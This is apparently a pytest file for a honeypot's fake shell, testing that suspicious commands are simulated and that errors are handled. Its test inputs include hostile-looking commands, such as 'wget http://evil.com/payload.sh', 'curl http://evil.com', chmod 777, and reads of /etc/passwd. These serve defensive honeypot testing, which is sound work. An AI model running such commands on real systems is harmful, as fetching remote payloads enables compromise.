"""Tests for fake shell - suspicious commands and error handling."""
import pytest

from honeypot.shell import FakeShell
from honeypot.session import Session


@pytest.fixture
def shell():
    session = Session(source_ip='127.0.0.1')
    return FakeShell(session)


class TestSuspiciousCommands:
    """Verify suspicious commands are simulated (no real execution)."""

    def test_wget_simulated(self, shell):
        output = shell.execute('wget http://evil.com/payload.sh')
        assert len(output) > 0

    def test_curl_simulated(self, shell):
        output = shell.execute('curl http://evil.com')
        assert len(output) > 0

    def test_sudo_simulated(self, shell):
        output = shell.execute('sudo ls')
        assert 'permission denied' in output.lower() or 'user1' in output.lower()

    def test_chmod_simulated(self, shell):
        output = shell.execute('chmod 777 /tmp/test')
        assert output is not None

    def test_chown_simulated(self, shell):
        output = shell.execute('chown root:root /tmp/test')
        assert output is not None

    def test_ssh_simulated(self, shell):
        output = shell.execute('ssh user@host')
        assert len(output) > 0

    def test_scp_simulated(self, shell):
        output = shell.execute('scp file user@host:/path')
        assert len(output) > 0


class TestErrorHandling:
    """Verify commands handle errors gracefully."""

    def test_unknown_command(self, shell):
        output = shell.execute('xyz_unknown')
        assert 'command not found' in output

    def test_cat_nonexistent_file(self, shell):
        output = shell.execute('cat /nonexistent')
        assert 'No such file' in output

    def test_rm_nonexistent_file(self, shell):
        output = shell.execute('rm /nonexistent')
        assert 'No such file' in output

    def test_cd_nonexistent_dir(self, shell):
        output = shell.execute('cd /nonexistent')
        assert 'No such file' in output

    def test_cd_into_file(self, shell):
        output = shell.execute('cd /etc/passwd')
        assert 'Not a directory' in output

    def test_ls_nonexistent(self, shell):
        output = shell.execute('ls /nonexistent')
        assert 'No such file' in output

    def test_grep_no_match(self, shell):
        output = shell.execute('grep zzz_no_match /etc/passwd')
        # grep returns empty string when no matches (like real grep)
        assert output == ''

    def test_head_nonexistent(self, shell):
        output = shell.execute('head /nonexistent')
        assert 'No such file' in output
